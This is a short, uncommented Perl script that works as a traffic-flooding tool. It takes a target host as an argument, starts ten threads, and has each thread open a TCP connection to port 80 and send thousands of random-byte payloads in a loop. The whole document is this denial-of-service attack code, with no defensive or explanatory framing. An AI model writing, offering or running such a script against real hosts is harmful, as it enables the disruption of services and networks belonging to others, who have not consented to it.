#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;
use threads;

my $target_host = $ARGV[0] or die "Usage: $0 <target_host>\n";

my $num_threads = 10;
my $packet_size = 1024;
my $num_packets = 10000;
my $delay = 0.1;

sub send_packets {
    my $local_port = int(rand(65535));
    my $target_port = 80;
    my $socket = IO::Socket::INET->new(
        Proto => 'tcp',
        LocalPort => $local_port,
        Type => SOCK_STREAM,
        PeerHost => $target_host,
        PeerPort => $target_port,
        ReuseAddr => 1
    );
    unless ($socket) {
        warn "Could not create socket: $!\n";
        return;
    }
    print "Connected to $target_host:$target_port from port $local_port\n";
    my $packet_data = join("", map { chr(int(rand(256))) } 1..$packet_size);
    for (my $i = 0; $i < $num_packets; $i++) {
        print $socket $packet_data;
        select(undef, undef, undef, $delay);
    }
    close($socket);
}

my @threads;
for (my $i = 0; $i < $num_threads; $i++) {
    push @threads, threads->create(\&send_packets);
}

foreach my $thread (@threads) {
    $thread->join();
}
